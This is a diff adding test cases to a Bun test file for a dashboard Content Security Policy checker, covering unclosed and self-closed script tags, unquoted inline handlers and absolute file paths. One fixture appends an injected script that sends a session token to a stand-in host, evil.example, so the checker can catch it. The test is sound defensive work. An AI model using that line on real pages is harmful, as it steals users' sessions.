@@ -1,3 +1,7 @@
+import { rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
+import process from 'node:process'
 import { describe, expect, test } from 'bun:test'
 import { checkShell, checkShells } from './check-dashboard-csp'
 
@@ -64,6 +68,27 @@ describe('checkShell', () => {
       .toEqual([expect.stringContaining('<form>')])
   })
 
+  // The pair regex is lazy: it skips an opening tag with no `</script>` after
+  // it. Before this case existed, an appended unclosed script passed clean while
+  // an earlier well-formed tag kept the count non-zero — a silent pass in the
+  // one check whose purpose is to not have one.
+  test('an unclosed trailing <script> fails rather than going uninspected', () => {
+    const appended = `${BUILT_SHELL}<script>\n  fetch('https://evil.example/?c=' + sessionStorage.getItem('honmoon_session'))\n`
+    expect(details(appended)).toEqual([expect.stringContaining('no readable `</script>`')])
+  })
+
+  // HTML does not honour `<script/>` as self-closing, so its content would run.
+  test('a self-closed <script/> is reported as unreadable, not as an unbuilt shell', () => {
+    expect(details('<script src="/a.js" />')).toEqual([
+      expect.stringContaining('no readable `</script>`'),
+    ])
+  })
+
+  test('an unquoted inline handler fails — HTML does not require the quotes', () => {
+    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick=go() id="root">')))
+      .toEqual([expect.stringContaining('inline event handler')])
+  })
+
   test('a fragment link is same-document, not an off-origin load', () => {
     expect(details(BUILT_SHELL.replace('<div id="root">', '<a href="#/audit">a</a><div id="root">')))
       .toEqual([])
@@ -71,6 +96,20 @@ describe('checkShell', () => {
 })
 
 describe('checkShells', () => {
+  // `join(REPO_ROOT, '/abs/path')` grafts the argument onto the root and then
+  // reports "not found", which reads as a missing build rather than a misread
+  // path. The script's own usage line invites an absolute argument.
+  test('an absolute path is read as given, not grafted onto the repository root', () => {
+    const absolute = join(tmpdir(), `honmoon-csp-shell-${process.pid}.html`)
+    writeFileSync(absolute, BUILT_SHELL)
+    try {
+      expect(checkShells([absolute])).toEqual([])
+    }
+    finally {
+      rmSync(absolute, { force: true })
+    }
+  })
+
   test('a missing artifact fails rather than being skipped', () => {
     expect(checkShells(['apps/dashboard/dist/no-such-shell.html']))
       .toEqual([{ shell: 'apps/dashboard/dist/no-such-shell.html', detail: expect.stringContaining('not found') }])
